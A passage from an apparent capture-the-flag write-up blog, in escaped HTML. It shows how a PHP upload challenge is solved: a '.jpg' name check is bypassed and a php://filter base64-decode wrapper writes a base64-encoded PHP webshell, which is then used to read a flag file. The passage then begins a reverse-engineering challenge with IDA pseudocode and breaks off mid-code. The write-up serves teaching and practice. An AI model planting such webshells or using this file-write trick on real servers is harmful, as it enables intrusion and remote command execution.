&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†fwrite&lt;/span&gt;($handle,&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;$all_content);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†fclose&lt;/span&gt;($handle);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†echo¬†&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Done.&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So we are going to have 2 things to bypass:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;File needs to have .jpg in its name&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;?php exit(0); ?&amp;gt;&lt;/code&gt; will be written at the beginning of the file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first condition is very easy to bypass, since &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;strpos&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; checks if ‚Äú.jpg‚Äù is &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;anywhere&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; in the file name, not at the end, so we can upload &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;exploit.jpg.php&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The second condition is more annoying, but by reading the &lt;a href=&#34;https://www.php.net/manual/en/function.fopen.php&#34;&gt;fopen manual&lt;/a&gt;, and the &lt;a href=&#34;https://www.php.net/manual/en/wrappers.php&#34;&gt;supported wrappers page&lt;/a&gt;, we understand that we can use &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;php wrappers&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; such as &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;filter://&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; inside of the fopen function&lt;/p&gt;
&lt;p&gt;This is useful because if we look at the top of the script, the name of the file is passed through the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;urldecode()&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; function&lt;/p&gt;
&lt;p&gt;That will allow us to have special characters such as / in our file name&lt;/p&gt;
&lt;p&gt;To prevent the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;exit(0)&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; from bothering us, we will be using the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;php://filter/convert.base64-decode&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; wrapper, because if we try to decode &lt;strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;/strong&gt; from base64, it gives us this: &lt;strong&gt;^+t&lt;/strong&gt;, which is exactly what we want&lt;/p&gt;
&lt;p&gt;Let‚Äôs base64 encode a php ‚Äúwebshell‚Äù:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;]); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and paste this into a file that we‚Äôll call&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Dshell.jpg.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;that way, when it will be passed through the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;urldecode&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;() function, the filename will look like this&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è php://filter/convert.base64-decode/resource=shell.jpg.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;He will then decode and write this to shell.jpg.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;which will look like this atfer decoding&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;]); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we‚Äôve got our webshell, we can get the flag from user‚Äôs home by navigating to &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/shell.jpg.php?cmd=cat ../../../../home/user/flag.txt&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268427-34eaece6-b4cb-4711-bfa4-a0c8a6f4a540.png&#34; alt=&#34;2022-12-17-202338_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;flag{ab5f69d6cc412345387a0ca3a4700398}&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;padlock&#34;&gt;Padlock&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @birch#9901

I forgot the combination to my pad lock :(
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;First step is to run the binary, and see how it acts&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268431-b33f5b14-4617-4e3d-9fa1-e91d9cf42ad3.png&#34; alt=&#34;2022-12-17-230325_551x808_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;It asks for a passcode, then probably compares it with the right passcode&lt;/p&gt;
&lt;p&gt;We‚Äôll throw it into IDA, and press &lt;strong&gt;&lt;strong&gt;F5&lt;/strong&gt;&lt;/strong&gt; to generate a pseudocode&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-30h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+38h] [rbp-8h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__readfsqword&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;print_lock&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;63LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter the passcode: &amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;__isoc99_fscanf&lt;/span&gt;(_bss_start, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The passcode you entered was: %s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;51LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;95LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;48LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;111LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;52LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;(s) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strcmp&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;master locks arent vry strong are they&amp;#34;&lt;/span&gt;, s) )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;101LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;32LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;111LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#ae81ff&#34;&gt;97LL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52LL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;unlock&lt;/span&gt;(s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not quite!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that it takes our input, then replaces some values and compares it with the string &lt;strong&gt;&amp;ldquo;master locks arent vry strong are they&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;These values in the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;replace()&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; function are annoying so we are going to select them and press &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;R&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; (which will give us their Char value)&lt;/p&gt;
&lt;p&gt;The pseudocode now looks like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-30h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+38h] [rbp-8h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__readfsqword&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;print_lock&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter the passcode: &amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;__isoc99_fscanf&lt;/span&gt;(_bss_start, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The passcode you entered was: %s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt;);
